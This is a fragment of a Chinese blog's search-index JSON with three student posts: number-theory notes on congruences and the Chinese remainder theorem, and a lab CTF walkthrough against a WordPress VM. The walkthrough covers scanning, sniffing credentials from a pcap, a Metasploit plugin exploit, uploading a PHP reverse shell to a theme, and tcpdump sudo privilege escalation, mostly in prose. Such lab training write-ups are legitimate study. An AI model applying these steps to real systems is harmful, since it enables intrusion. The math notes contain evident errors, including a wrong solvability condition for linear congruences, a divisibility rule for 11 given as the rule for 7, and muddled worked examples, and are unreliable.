m)f(a) \\equiv 0(mod \\ m) f(a)≡0(mod m) 则a叫做该同余式的解；x≡a(mod m)x \\equiv a (mod \\ m)x≡a(mod m)的所有整数都使得同余式成立，即a所在的剩余类。 ¶一次同余式🌿 由于1次以上的同余式都太复杂了，所以手算程度上我们主要掌握的是一次同余式； 一次同余式解的存在性判定：🌟 ax≡n(mod m)ax \\equiv n(mod \\ m) ax≡n(mod m) 有解的充分必要条件是(a,m)=n,而且，解是唯一的","text":"【信息安全数学基础】同余式 可以简单点理解为上一章学习的同余的概念中混入了x（手动滑稽） ¶同余式的基本概念 什么是同余式？ 设m是一个正整数，f（x）为多项式； f(x)=anxn+⋅⋅⋅+a1x+a0f(x) = a_nx^n + \\cdot \\cdot \\cdot +a_1x +a_0 f(x)=an​xn+⋅⋅⋅+a1​x+a0​ 其中ai为a_i为ai​为整数，则： f(x)≡0(mod n)f(x) \\equiv 0(mod \\ n) f(x)≡0(mod n) 叫做模m的同余式，如果an≢0(mod m)a_n \\not\\equiv 0(mod \\ m)an​​≡0(mod m),则n叫做f(x)的次数，记作degf. 如果整数x=a满足： f(a)≡0(mod m)f(a) \\equiv 0(mod \\ m) f(a)≡0(mod m) 则a叫做该同余式的解；x≡a(mod m)x \\equiv a (mod \\ m)x≡a(mod m)的所有整数都使得同余式成立，即a所在的剩余类。 ¶一次同余式🌿 由于1次以上的同余式都太复杂了，所以手算程度上我们主要掌握的是一次同余式； 一次同余式解的存在性判定：🌟 ax≡n(mod m)ax \\equiv n(mod \\ m) ax≡n(mod m) 有解的充分必要条件是(a,m)=n,而且，解是唯一的 模m的可逆元 设m是一个正整数，a是一个整数，如果整数a‘存在使得： a⋅a′≡a′⋅a≡1(mod m)a \\cdot a&#x27; \\equiv a&#x27; \\cdot a \\equiv 1 (mod \\ m) a⋅a′≡a′⋅a≡1(mod m) 成立，则a叫做模m的可逆元； 模m的同余的求解：🌟 第一步：均是判断解的存在性，存在之后再去进行下一步的求解，运用到上面那一个问题的解答； 对于一次同余式ax≡1 mod max \\equiv 1 \\ mod \\ max≡1 mod m类型，一定有s⋅a+t⋅m=1s \\cdot a + t \\cdot m = 1s⋅a+t⋅m=1而x=s mod mx = s \\ mod \\ mx=s mod m就是解，且具有唯一性； P92 一次同余式一般式ax≡b mod max \\equiv b \\ mod \\ max≡b mod m的求解，首先对于式子进行化简，每个数均除以（a，m），得到a1x≡b1 mod m1a_1x \\equiv b_1 \\ mod \\ m_1a1​x≡b1​ mod m1​,再求出特殊式a1x′≡1 mod m1a_1x&#x27; \\equiv 1 \\ mod \\ m_1a1​x′≡1 mod m1​的特解x′x&#x27;x′,然后写出同余式a1x≡b1 mod m1a_1x \\equiv b_1 \\ mod \\ m_1a1​x≡b1​ mod m1​，直接可以得到的一个特解就是x0≡b1⋅x′ mod m1x_0 \\equiv b_1 \\cdot x&#x27; \\ mod \\ m_1x0​≡b1​⋅x′ mod m1​; P94 一道例题： 求解一次同余式 33x=22(mod 77)33x = 22(mod \\ 77) 33x=22(mod 77) 解：首先计算（33.77）= 11 ｜22，所以该同余式有解； 接下来对上述同余式同时除以11，可以得到： 3x=2(mod 7)3x = 2(mod \\ 7) 3x=2(mod 7) 把2用1来替换可以得到： 3x=1(mod 7)3x=1(mod \\ 7) 3x=1(mod 7) 很容易可以求得特殊解：x0′=5x_0&#x27; = 5x0′​=5 再次写出： 3x=2(mod 7)3x = 2(mod \\ 7) 3x=2(mod 7) 的一个特解是x0≡2⋅x0′≡2⋅5≡3(mod 7)x_0 \\equiv 2 \\cdot x_0&#x27; \\equiv 2 \\cdot 5 \\equiv 3 (mod \\ 7)x0​≡2⋅x0′​≡2⋅5≡3(mod 7) 最后可以写出同余式的解： x=3+t⋅7(mod 77),t=0,1,2⋅⋅⋅⋅x = 3+t \\cdot 7(mod \\ 77),t=0,1,2 \\cdot \\cdot \\cdot \\cdot x=3+t⋅7(mod 77),t=0,1,2⋅⋅⋅⋅ 注意这里的为模77 ¶中国剩余定理 🌿 用于求解同余式组 P97 设m1,m2,⋅⋅⋅m_1,m_2,\\cdot \\cdot \\cdotm1​,m2​,⋅⋅⋅ 是k个两两互素的正整数，则对任意的整数$b_1,b_2, \\cdot \\cdot \\cdot ,b_k $同余式组： {x≡(mod m1)...x≡(mod mk)\\begin{cases} x \\equiv (mod \\ m_1) \\\\ ...\\\\ x \\equiv (mod \\ m_k) \\\\ \\end{cases} ⎩⎪⎪⎨⎪⎪⎧​x≡(mod m1​)...x≡(mod mk​)​ 一定有解，且解是唯一的； 若令： m=m1⋅⋅⋅mk,m=mi⋅Mi,i=1,⋅⋅⋅,km=m_1 \\cdot \\cdot \\cdot m_k,m = m_i \\cdot M_i, i=1, \\cdot \\cdot \\cdot,k m=m1​⋅⋅⋅mk​,m=mi​⋅Mi​,i=1,⋅⋅⋅,k 则同余式组的解可表示为 x≡b1⋅M1′⋅M1+b2⋅M2′⋅M2+⋅⋅⋅+bk⋅Mk′⋅Mk(mod m)x \\equiv b_1 \\cdot M_1&#x27; \\cdot M_1 + b_2 \\cdot M_2&#x27; \\cdot M_2 + \\cdot \\cdot \\cdot + b_k \\cdot M_k&#x27; \\cdot M_k(mod \\ m) x≡b1​⋅M1′​⋅M1​+b2​⋅M2′​⋅M2​+⋅⋅⋅+bk​⋅Mk′​⋅Mk​(mod m) 其中 Mi′⋅Mi≡1(mod mi),i=1,2,⋅⋅⋅,kM_i&#x27; \\cdot M_i \\equiv 1 (mod \\ m_i), i=1,2,\\cdot \\cdot \\cdot,k Mi′​⋅Mi​≡1(mod mi​),i=1,2,⋅⋅⋅,k ¶中国剩余定理的应用 ==》 一些例题 计算21000000(mod 77)2^{1000000}(mod \\ 77)21000000(mod 77) 解：令x = 210000002^{1000000}21000000 . 因为 77 = 11 * 7 ，所以计算x mod 77 可以等价于求解两个同余式： {x≡b1 (mod 11)x≡b2 (mod 7)\\begin{cases} x \\equiv b1 \\ (mod \\ 11) \\\\ x \\equiv b2 \\ (mod \\ 7) \\\\ \\end{cases} {x≡b1 (mod 11)x≡b2 (mod 7)​ 由Euler定理可得： 2ϕ(11)≡210≡1(mod 11)2^{\\phi(11)} \\equiv 2^{10} \\equiv 1 (mod \\ 11)2ϕ(11)≡210≡1(mod 11) 那么就可以得到： x≡(210)100000≡1(mod 11)x \\equiv (2^{10})^{100000} \\equiv 1 (mod \\ 11)x≡(210)100000≡1(mod 11) 则 b1 = 1 同理有: x≡(26)166666⋅24≡2(mod 7)x \\equiv (2^{6})^{166666} \\cdot 2^4 \\equiv 2 (mod \\ 7)x≡(26)166666⋅24≡2(mod 7), 则b2 = 2 令m2 = 11 , m1 = 7，则 m = 11 * 7 = 77. M1=m2=11,M2=m1=7M_1 = m_2 = 11,M_2 = m_1 = 7 M1​=m2​=11,M2​=m1​=7 可以得到： 11M1′≡2(mod 7)7M2′≡8(mod 11)11M_1&#x27; \\equiv 2(mod \\ 7)\\\\ 7M_2&#x27; \\equiv 8 (mod \\ 11) 11M1′​≡2(mod 7)7M2′​≡8(mod 11) 最后可以得到结果： x≡2⋅11⋅2+1⋅8⋅7 (mod 77)x≡23 (mod 77)x \\equiv 2 \\cdot 11 \\cdot 2 + 1 \\cdot 8 \\cdot 7 \\ (mod \\ 77) \\\\ x \\equiv 23 \\ (mod \\ 77) x≡2⋅11⋅2+1⋅8⋅7 (mod 77)x≡23 (mod 77) 计算 31213(mod 667)312^{13}(mod \\ 667)31213(mod 667) （中国剩余定理和模重复平方法的结合） 解：令x = 31213312^{13}31213, 667 = 23 * 29 则同余式可以化为： {x≡b1 (mod 23)x≡b2 (mod 29)\\begin{cases} x \\equiv b1 \\ (mod \\ 23) \\\\ x \\equiv b2 \\ (mod \\ 29) \\\\ \\end{cases} {x≡b1 (mod 23)x≡b2 (mod 29)​ 由模重复平方法可得：b1≡31313≡8(mod 23)b1 \\equiv 313^{13} \\equiv 8(mod \\ 23)b1≡31313≡8(mod 23),b2≡31212≡4(mod 29)b2 \\equiv 312^{12} \\equiv 4 (mod \\ 29)b2≡31212≡4(mod 29); 令m1 = 23；m2 = 29： 则M1 = 29，M2 = 23； 可以得到： 29M1′≡1(mod 23)23M2′≡1(mod 29)29M_1&#x27; \\equiv 1(mod \\ 23)\\\\ 23M_2&#x27; \\equiv 1(mod \\ 29) 29M1′​≡1(mod 23)23M2′​≡1(mod 29) 解得：M1′=4M_1&#x27; = 4M1′​=4,M2′=−5M_2&#x27; = -5M2′​=−5 x≡8⋅4⋅29+4⋅(−5)⋅23(mod 667)≡468(mod 667)x \\equiv 8 \\cdot 4 \\cdot 29 + 4 \\cdot (-5) \\cdot 23 (mod \\ 667) \\equiv 468 (mod \\ 667) x≡8⋅4⋅29+4⋅(−5)⋅23(mod 667)≡468(mod 667)","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【白帽子学习笔记】CTF实践","slug":"【白帽子学习笔记】CTF实践","date":"2020-12-05T15:42:04.000Z","updated":"2020-12-19T05:20:03.722Z","comments":true,"path":"2020/12/05/【白帽子学习笔记】CTF实践/","link":"","permalink":"http://example.com/2020/12/05/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91CTF%E5%AE%9E%E8%B7%B5/","excerpt":"【白帽子学习笔记】CTF实践 ¶0x01 实验知识点 ¶1x01 什么是CTF？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 ¶1x02 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 （3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。","text":"【白帽子学习笔记】CTF实践 ¶0x01 实验知识点 ¶1x01 什么是CTF？ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。 ¶1x02 CTF竞赛模式 （1）解题模式（Jeopardy）在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 （2）攻防模式（Attack-Defense）在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 （3）混合模式（Mix）结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。 1.2 CTF各大题型简介 ¶1x03 CTF各大题型简介 MISC（安全杂项） 全称Miscellaneous。题目涉及流量分析、电子取证、人肉搜索、数据分析、大数据统计等等，覆盖面比较广。我们平时看到的社工类题目；给你一个流量包让你分析的题目；取证分析题目，都属于这类题目。主要考查参赛选手的各种基础综合知识，考察范围比较广。 PPC（编程类） 全称Professionally Program Coder。题目涉及到程序编写、编程算法实现。算法的逆向编写，批量处理等，有时候用编程去处理问题，会方便的多。当然PPC相比ACM来说，还是较为容易的。至于编程语言嘛，推荐使用Python来尝试。这部分主要考察选手的快速编程能力。 CRYPTO（密码学） 全称Cryptography。题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。这样的题目汇集的最多。这部分主要考查参赛选手密码学相关知识点。 REVERSE（逆向） 题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译扎实功底。需要掌握汇编，堆栈、寄存器方面的知识。有好的逻辑思维能力。主要考查参赛选手的逆向分析能力。此类题目也是线下比赛的考察重点。 STEGA（隐写） 全称Steganography。题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛选手获取。载体就是图片、音频、视频等，可能是修改了这些载体来隐藏flag，也可能将flag隐藏在这些载体的二进制空白位置。有时候需要你侦探精神足够的强，才能发现。此类题目主要考查参赛选手的对各种隐写工具、隐写算法的熟悉程度。 PWN（溢出） PWN在黑客俚语中代表着攻破，取得权限，在CTF比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有栈溢出、堆溢出。在CTF比赛中，线上比赛会有，但是比例不会太重，进入线下比赛，逆向和溢出则是战队实力的关键。主要考察参数选手漏洞挖掘和利用能力。 WEB（web类） WEB应用在今天越来越广泛，也是CTF夺旗竞赛中的主要题型，题目涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码审计、上传等漏洞。这些题目都不是简单的注入、上传题目，至少会有一层的安全过滤，需要选手想办法绕过。且Web题目是国内比较多也是大家比较喜欢的题目。因为大多数人开始安全都是从web*站开始的。 ¶0x02 获取Web Developer中的flag ¶1x01 Net Discover 首先通过namp扫描存活的主机，成功发现了Web Developer； ¶1x02 Nmap信息收集 接下来使用Nmap扫描Web Developer检查一下端口的开放情况； nmap 10.34.80.3 可以看到开放了80端口和22端口，这两个端口的作用分别是http端口（网页）和ssh端口（远程登陆）； ¶1x03 访问网站 因为网站开放了80端口，所以可以尝试登陆http端口 发现有一个搭建了一个个人模块网站，这个网站应该是一个比较经典的CMS了，记得我当初刚买服务器的时候@visualDust给我搭了这一个这个网站。 ¶1x04 whatweb探寻 通过whatweb进行检测可以发现该网站的如下信息： 从内容信息中可以得到，该网站的CMS为WordPress； ¶1x05 wpscan WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。 ¶1x06 Dirb爆破 使用dirb来爆破网站的根目录； dirb -u http://10.34.80.3 找到一个 http://10.34.80.3/ipdata/ 感觉这个很像流量信息，进去看一看吧 ¶1x07 wireshark数据分析 在获取了网站数据流信息后，我们尝试使用wireshark进行一次分析；尝试搜索一下login，结果有惊奇的发现； 成功找到了登陆界面: 我们随便提交一个，找到信息post去的地址： 确定了之后就去找发送到相应url下的post信息； 尝试筛选http请求类型为post的请求，找到了这两个： 可以看到账号密码就在这里，密码好像是做了一定的加密，当时这个不是问题； 我们把burp打开，然后随便输入一个账号和密码，在burp里面给他改一下，然后再把请求放过去就可以了； 下图是我们的请求； 很明显可以发现，log对应的是用户名，pwd对应的是密码；然后我们把他给改掉 成功进入网站后台! ¶1x08 使用wordpress的插件漏洞进行提权 这里可以使用三种方案进行实现： ¶2x01 MeterSploit + reflex gallery 首先我们先需要给这个wordpress安装reflex gallery插件； 去plugins界面搜索一下reflex，安装上去就好； 当然了你也可以选择本地上传安装； 安装成功之后记得把插件激活一下！ 接下来使用msf来控制漏洞： 出现meterpreter&gt;说明可以控制了，我们可以在这里输入Linux命令来查看一些文件： 回退到/var/www/html之后可以看到wp-config.php； 查看一下里面的内容： 可以在里面找到数据库的用户和密码： ¶2x02 反弹Shell 上传反弹shell。http://pentestmonkey.net/tools/web-shells/php-reverse-shell 【目的：PHP网站渗透；实现途径：上传网站后，URL访问(含有)该反弹shell的页面。 功能：该脚本会发起反弹TCP连接到攻击者（脚本中指定攻击者IP地址和端口号）。】 我们把代码稍微修改一下，ip改成10.34.80.3, 反弹端口设为4444； 首先需要把这里的theme给修改为Twenty Sixteen，记得点击Select，然后点击Leave！ 然后将php文件复制粘贴过来==》记得upload！ 注意一下，因为我实在找不到404.PHP的url路径，所以我就改了search.php，效果就是搜索的时候触发 还有一件事! , 因为刚才修改了theme，这里需要把对应的主界面也改了；（不改好像也行） 接下来我们使用kali的nc监听刚才设置的4444端口。 现在我们search一下就可以发现nc里面已经可以操作了！ 经过路径的探寻后找到了wp_config.php 文件 ¶2x03 利用文件管理插件（File manager）漏洞 这个没啥技术含量，安装了插件之后直接就可以查看了；这里就不写了 ¶1x09 ssh登陆该网站 这里我们尝试用上一步中获取的数据库密码来登陆 结果发现遇到了这个问题： 这里我们进行一下修改配置文件，sudo vim /etc/ssh/ssh_config打开这个文件，然后在最下面添加： # StrictHostKeyChecking ask改成StrictHostKeyChecking no 然后输入：ssh webdeveloper@10.34.80.3 成功登录了进来! 尝试查看发现权限不足： 查看一下可以执行的sudo命令 发现可以root权限执行tcpdump命令 创建攻击文件 tcpdump命令详解： -i eth0 从指定网卡捕获数据包 -w /dev/null 将捕获到的数据包输出到空设备（不输出数据包结果） -z [command] 运行指定的命令 -Z [user] 指定用户执行命令 -G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储 -W [num] 指定抓包数量 ¶0x03 实验小结 本次的实验中完整的做了一次从发现目标主机到获取flag的过程，在实现的过程中包括了 通过扫描发现目标主机 根据主机开放的80端口找到其的网页 通过扫描网页目录找到流量包 Wireshark解析流量包 获取管理员密码 根据网页的cms找到通用漏洞 tcpdump提权 总之这次的实验做的很爽","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"【信息安全数学导论】同余","slug":"【信息安全数学导论】同余","date":"2020-12-03T18:03:43.000Z","updated":"2020-12-10T06:00:54.584Z","comments":true,"path":"2020/12/04/【信息安全数学导论】同余/","link":"","permalink":"http://example.com/2020/12/04/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%AF%BC%E8%AE%BA%E3%80%91%E5%90%8C%E4%BD%99/","excerpt":"第二章 同余 我感觉我已经快学到去世了，呜呜呜 ¶同余的定义 如果a - b 被 m 整除，或 m｜a - b，就记作 a≡b(mod n)a \\equiv b(mod\\ n)a≡b(mod n) 叫做a，b摸n同余。 a，b模n同余的意思翻译过来其实就是a-b可以被n整除； ¶同余的判断 如何判断两个数是否同余呢？`》 判断是否存在一个整数q使得： a=b+q⋅ma = b + q \\cdot m a=b+q⋅m 其一点从定义中就很容易的可以推出来； 模同余的等价关系（自反性，对称性，传递性）可以用来快速的判断a和b是否模m同余； （1）对于任意整数a 都有a≡a(mod m)a \\equiv a(mod\\ m)a≡a(mod m) （2）若 a≡b(mod n)a \\equiv b(mod \\ n)a≡b(mod n),则 b≡a(mod n)b \\equiv a(mod \\ n)b≡a(mod n)；这个做题有时候还是会遇到的，需要注意一下； （3）若a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m)，b≡c(mod m)b \\equiv c(mod \\ m)b≡c(mod m)，则a≡c(mod m)a \\equiv c(mod \\ m)a≡c(mod m)","text":"第二章 同余 我感觉我已经快学到去世了，呜呜呜 ¶同余的定义 如果a - b 被 m 整除，或 m｜a - b，就记作 a≡b(mod n)a \\equiv b(mod\\ n)a≡b(mod n) 叫做a，b摸n同余。 a，b模n同余的意思翻译过来其实就是a-b可以被n整除； ¶同余的判断 如何判断两个数是否同余呢？`》 判断是否存在一个整数q使得： a=b+q⋅ma = b + q \\cdot m a=b+q⋅m 其一点从定义中就很容易的可以推出来； 模同余的等价关系（自反性，对称性，传递性）可以用来快速的判断a和b是否模m同余； （1）对于任意整数a 都有a≡a(mod m)a \\equiv a(mod\\ m)a≡a(mod m) （2）若 a≡b(mod n)a \\equiv b(mod \\ n)a≡b(mod n),则 b≡a(mod n)b \\equiv a(mod \\ n)b≡a(mod n)；这个做题有时候还是会遇到的，需要注意一下； （3）若a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m)，b≡c(mod m)b \\equiv c(mod \\ m)b≡c(mod m)，则a≡c(mod m)a \\equiv c(mod \\ m)a≡c(mod m) 由最小非负余数来判断同余 a，b模m同余的充分必要条件是a，b被m除的余数相同；其实我感觉这条性质是最接近同余这个名字的了，同余同余，两个数的余数相同不就叫做同余吗？ 通过整数a，b模m的加法运算和乘法运算的性质来判断a，b模m是否同余 如果a1≡b1(mod m)a_1 \\equiv b_1(mod \\ m)a1​≡b1​(mod m),a2≡b2(mod m)a_2 \\equiv b_2 (mod \\ m )a2​≡b2​(mod m) 则： （1）a1+a2≡b1+b2(mod m)a_1+a_2 \\equiv b_1 + b_2(mod \\ m)a1​+a2​≡b1​+b2​(mod m) （2）a1⋅a2≡b1⋅b2(mod m)a_1 \\cdot a_2 \\equiv b_1 \\cdot b_2(mod \\ m)a1​⋅a2​≡b1​⋅b2​(mod m) 如何便捷的判断n是 否可以被3或者9整除？（可以用于判断大数时候可以被3和9整除） 假设 m 是 n 各位数字的合，则： （i）3｜n的充分必要条件是`》3 ｜ m （ii）9｜n的充分必要条件是=〉 9｜m 如何便捷的判断大数能否被11、13、7整除？ 7可以整除n的充分必要条件就是7可以整除整数: (a0+a2+⋅⋅⋅)−(a1+a3+⋅⋅⋅)(a_0+a_2+ \\cdot \\cdot \\cdot)-(a_1 + a_3 + \\cdot \\cdot \\cdot) (a0​+a2​+⋅⋅⋅)−(a1​+a3​+⋅⋅⋅) a0−ana_0 - a_na0​−an​就是数字n各位上的数字； ¶同余的性质 设m是一个正整数，设d⋅a≡d⋅b(mod m)d \\cdot a \\equiv d \\cdot b(mod \\ m)d⋅a≡d⋅b(mod m). 如果(d,m) = 1即d和m互素，则 a≡b(mod m)a \\equiv b(mod \\ m) a≡b(mod m) ​ 这一点类似于同余的消去律？ 还有一条类似的性质：设a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m) ，如果整数d∣(a,b,m)d | (a,b,m)d∣(a,b,m),则 ad≡bd(mod md)\\frac{a}{d} \\equiv \\frac{b}{d}(mod \\ \\frac{m}{d}) da​≡db​(mod dm​) 如果a，b关于mim_imi​（i从1到k）同余，那么a，b关于这一堆数的最大公倍数n同余； 设a≡b(mod p⋅q)a \\equiv b(mod \\ p \\cdot q)a≡b(mod p⋅q),则： (a,m)=(b,m)(a,m)=(b,m) (a,m)=(b,m) 如果 a≡b(mod c)a \\equiv b (mod \\ c)a≡b(mod c)且a≡b(mod d)a \\equiv b(mod \\ d)a≡b(mod d)，则： a≡b(mod [c,d])a \\equiv b(mod \\ [c,d]) a≡b(mod [c,d]) ¶剩余类和完全剩余系 ¶剩余类和剩余 由于同余是一种等价关系，对于整数m，可以把所有的整数分成m类，每一类对于m都同余；每一类都叫做m的一个剩余类；一般用CaC_aCa​来表示。CaC_aCa​是非空集合； 可以发现剩余类其实就是等价关系中的一个等价类；又扯到离散上去了，裂开； 设m是一个正整数，则 任何一个整数包含在一个CrC_rCr​中，0&lt;=r&lt;=m−10 &lt;= r &lt;= m-10&lt;=r&lt;=m−1 Ca=CbC_a = C_bCa​=Cb​的充分必要条件就是：a≡b(mod m)a \\equiv b(mod \\ m)a≡b(mod m) Ca与CbC_a与C_bCa​与Cb​的交集为空集的充分必要条件是： a≢(mod m)a \\not\\equiv (mod \\ m)a​≡(mod m) 一个剩余类中的任一个数都叫做该类的剩余，或者代表元 ¶完全剩余系 对于一个数m，现在有m个数，每一个都来自于不同的剩余类，那么这m个数就叫做模m的一个剩余系；记作Z/mZZ/mZZ/mZ或者ZmZ_mZm​。当 m=pm=pm=p为素数的时候也可以写成Fp=Z/pZ=ZpF_p = Z/pZ = Z_pFp​=Z/pZ=Zp​ m个整数构成一个完全剩余系的条件：其实在定义中也就可以发现了，m个整数r0,r1,r2,⋅⋅⋅,rm−1r_0,r_1,r_2, \\cdot \\cdot \\cdot ,r_{m-1}r0​,r1​,r2​,⋅⋅⋅,rm−1​为模m的一个完成剩余系的充分必要条件是他们模m两两不同余； 设m是正整数，a是满足（a，m）=1的整数，b是任意整数，若k遍历模m的一个完全剩余系，则：a⋅k+ba \\cdot k+ ba⋅k+b 也遍历模m的一个完全剩余系； 完全剩余系的加法原则？ 如果k1,k2k_1,k_2k1​,k2​分别遍历模m1,m2m_1,m_2m1​,m2​的完全剩余系,则：m2⋅k1+m1⋅k2m_2 \\cdot k_1 + m_1 \\cdot k_2m2​⋅k1​+m1​⋅k2​，遍历模 m1⋅m2m_1 \\cdot m_2m1​⋅m2​的完全剩余系. 这条规则还可以拓展到多个模的情况； ¶简化剩余类与欧拉函数 ¶欧拉函数 一个正整数m，1到m-1中与m互素的整数的个数记作ϕ(x)\\phi(x)ϕ(x),通常叫做欧拉函数； 一个素数p，ϕ(p)=p−1\\phi(p)=p-1ϕ(p)=p−1 对于素数幂m=pαm=p^{\\alpha}m=pα，p为素数，则：ϕ(m)=pα−pα−1=m(1−1p)\\phi(m) = p^{\\alpha}-p^{\\alpha - 1} = m(1-\\frac{1}{p})ϕ(m)=pα−pα−1=m(1−p1​) ¶简化剩余类 如果剩余类中存在一个剩余与m互素，那么这个剩余类就叫做简化剩余类，简化剩余类中的剩余叫做简化剩余； 简化剩余类的这个定义与剩余的选取无关； 两个简化剩余的乘积仍然是简化剩余； 类比剩余系的概念，我们可以理解简化剩余系，∣(Z/mZ)∗∣=ϕ(m)|(Z/mZ)^*|=\\phi(m)∣(Z/mZ)∗∣=ϕ(m) 设m是一个整数数，若r1,r2,⋅⋅⋅rϕ(m)r_1,r_2, \\cdot \\cdot \\cdot r_{\\phi(m)}r1​,r2​,⋅⋅⋅rϕ(m)​是ϕ(x)\\phi(x)ϕ(x)个与m互素的整数，并且两两模m不同余，则r1,r2,⋅⋅⋅rϕ(m)r_1,r_2, \\cdot \\cdot \\cdot r_{\\phi(m)}r1​,r2​,⋅⋅⋅rϕ(m)​是模m的一个简化剩余系。 对于正整数m，若整数a满足(a,m)=1,如果k遍历模m的一个简化剩余系则a⋅ka \\cdot ka⋅k也遍历模m的一个简化剩余系。 对于正整数m，a是满足(a,m)=1的整数，则存在唯一的整数a‘，1 &lt;= a’ &lt; m 使得： a⋅a′≡1(mod m)a \\cdot a&#x27; \\equiv 1(mod \\ m) a⋅a′≡1(mod m) a’就叫做模m的逆元； 两个模的简化剩余系： 设m1，m2是互素的两个正整数，如果k1，k2分别遍历模m1和模m2的简化剩余系，则： m2⋅k1+m1⋅k2m_2 \\cdot k_1 + m_1 \\cdot k_2 m2​⋅k1​+m1​⋅k2​ 遍历模m1⋅m2m_1 \\cdot m_2m1​⋅m2​的简化剩余系. ¶欧拉函数的性质 ¶如何快速的求出欧拉函数值？ 设m，n是互素的两个正整数，则 ϕ(m⋅n)=ϕ(m)⋅ϕ(n)\\phi(m \\cdot n)=\\phi(m) \\cdot \\phi(n)ϕ(m⋅n)=ϕ(m)⋅ϕ(n) 而且这个公式可以无限套娃，也就是说ϕ(m)和ϕ(n)\\phi(m)和\\phi(n)ϕ(m)和ϕ(n)还可以继续往下分； 幂次方的乘积应该如何求它的欧拉函数呢？ m=p1α1⋅⋅⋅p2αsm =p_1^{\\alpha_1} \\cdot \\cdot \\cdot p_2^{\\alpha_s } m=p1α1​​⋅⋅⋅p2αs​​ 则： ϕ(x)=m(1−1p1)⋅⋅⋅(1−1pk)\\phi(x) = m(1-\\frac{1}{p_1}) \\cdot \\cdot \\cdot (1-\\frac{1}{p_k}) ϕ(x)=m(1−p1​1​)⋅⋅⋅(1−pk​1​) 设p，q是不同的素数，则 ϕ(p⋅q)=p⋅q−p−q+1\\phi(p \\cdot q) = p \\cdot q - p -q +1 ϕ(p⋅q)=p⋅q−p−q+1 ¶欧拉定理、费马小定理和Wilson定理 ¶欧拉定理 设m数大于1的整数，如果是a满足（a，m）= 1的整数，则 aϕ(m)≡1(mod m)a^{\\phi(m)} \\equiv 1(mod \\ m) aϕ(m)≡1(mod m) ¶费马小定理 研究模m=p为素数时候，整数ak(mod p)a^k(mod \\ p)ak(mod p)的性质. 设p是一个素数，则对任意整数a，有 ap≡a(mod p)a^p \\equiv a(mod \\ p) ap≡a(mod p) 